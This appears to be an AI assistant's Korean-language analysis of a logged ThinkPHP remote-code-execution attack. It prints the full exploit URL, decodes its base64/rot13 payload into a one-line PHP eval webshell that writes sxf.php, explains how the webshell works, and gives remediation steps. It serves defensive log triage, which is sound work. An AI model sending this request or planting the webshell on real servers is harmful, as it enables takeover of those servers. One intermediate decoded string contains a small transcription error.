/index.php?s\=/index/%5Cthink%5CView/display&content\=%22%3C?%3E%3C?php%20call_user_func(%22file_put_contents%22,%22php://filter/write\=convert.base64-decode%7Cstring.rot13/resource\=sxf.php%22,%22PD9jdWMgcmVlYmVfZXJjYmVndmF0KDApOyRuPSckX2NiZmdbImsiXSc7JG89ZmdlZ2JoY2NyZSgiJG4iKTtyaW55KCJyaW55KCRvKTsiKT8%2BdXJlcg\=\=%22)?%3E&data\=1

**ThinkPHP 프레임워크의 취약점을 악용하여 서버에 악성 백도어 파일을 생성하려는 공격 코드(Exploit)**


### 1. 구문 분석 및 위험성

이 코드는 다음과 같은 단계를 거쳐 서버를 해킹하려고 시도합니다.

* **취약점 타겟:** `think\View/display`를 호출하여 원격 코드 실행(RCE) 취약점을 이용합니다.
* **파일 생성 도구:** `call_user_func("file_put_contents", ...)`를 사용하여 서버 내부에 물리적인 파일을 쓰려고 합니다.
* **우회 기법 (Obfuscation):** * 탐지를 피하기 위해 `base64-decode`와 `string.rot13` 필터를 중첩해서 사용했습니다.
* `sxf.php`라는 이름의 파일을 생성하도록 설정되어 있습니다.


* **페이로드 내용:** 인코딩된 문자열(`PD9jdWM...`)을 디코딩하면 실제 실행 가능한 **PHP 웹셸(Webshell)** 코드가 나옵니다. 이 웹셸은 공격자가 서버의 제어권을 탈취하고 임의의 명령을 실행할 수 있게 만듭니다.

### 2. 보안 판단

* **유효성:** 공격 코드로서의 문법은 유효하며, 해당 취약점이 패치되지 않은 구버전 ThinkPHP 서버에서는 실제로 작동합니다.
* **위험도:** **심각(Critical)**. 서버의 파일 시스템에 접근하여 권한을 탈취하려는 명백한 해킹 시도입니다.

### 3. 권장 조치 사항

만약 이 구문을 서버 로그에서 발견하셨다면, 즉시 다음 조치를 취해야 합니다.

1. **프레임워크 업데이트:** ThinkPHP를 최신 버전으로 업데이트하여 해당 RCE 취약점을 차단하세요.
2. **파일 점검:** 서버 내에 `sxf.php` 또는 이와 유사한 생소한 파일이 생성되었는지 확인하고 삭제하세요.
3. **웹 방화벽(WAF) 설정:** `file_put_contents`, `base64-decode`, `rot13` 등이 포함된 비정상적인 URL 요청을 차단하도록 룰을 강화하세요.
4. **로그 전수 조사:** 해당 IP로부터 다른 공격 시도가 있었는지, 이미 침투에 성공했는지 로그를 분석해야 합니다.

---

인코딩된 문자열은 **Base64**와 **ROT13**이라는 두 가지 방식으로 꼬여 있습니다. 이를 순차적으로 풀면 공격자가 숨겨놓은 실제 PHP 코드가 드러납니다.

이 코드는 **서버에 전송된 임의의 명령을 실행하는 "한 줄짜리 웹셸(Webshell)"**입니다.

---

### 1. 디코딩 과정 및 결과

이 공격 구문은 `convert.base64-decode | string.rot13`이라는 필터를 사용합니다.

**1단계: Base64 디코딩**
`PD9jdWMgcmVlYmVfZXJjYmVndmF0KDApOyRuPSckX2NiZmdbImsiXSc7JG89ZmdlZ2JoY2NyZSgiJG4iKTtyaW55KCJyaW55KCRvKTsiKT8+dXJlcg==`
위 문자열을 Base64로 풀면 다음과 같은 ROT13 문자열이 나옵니다.

> `<?puc reebe_ercbegvat(0);$n='$_pbfg["k"]';$o=fgegbhccre("$n");riny("riny($o);")?>urer`

**2단계: ROT13 디코딩 (최종 코드)**
위의 결과물에 ROT13(알파벳을 13칸씩 밀기)을 적용하면 우리가 읽을 수 있는 PHP 코드가 완성됩니다.

> **`<?php error_reporting(0);$n='$_post["x"]';$o=strtoupper("$n");eval("eval($o);")?>`**

---

### 2. 코드의 기능 (해킹 원리)

해당 코드가 서버에 `sxf.php`로 저장되면, 공격자는 다음과 같은 일을 할 수 있습니다.

* **`error_reporting(0);`**: 공격 흔적이나 에러 메시지가 서버 로그에 남지 않도록 가립니다.
* **`$_post["x"]`**: 공격자가 HTTP POST 방식으로 `x`라는 변수에 담아 보내는 모든 값을 읽어들입니다.
* **`eval(...)`**: 가장 위험한 함수입니다. **전송받은 문자열을 PHP 명령어로 인식하여 그대로 실행**합니다.

즉, 공격자가 `x` 값에 "서버의 모든 파일을 삭제하라"거나 "DB 정보를 유출하라"는 명령을 담아 보내면 서버는 그대로 실행하게 됩니다.
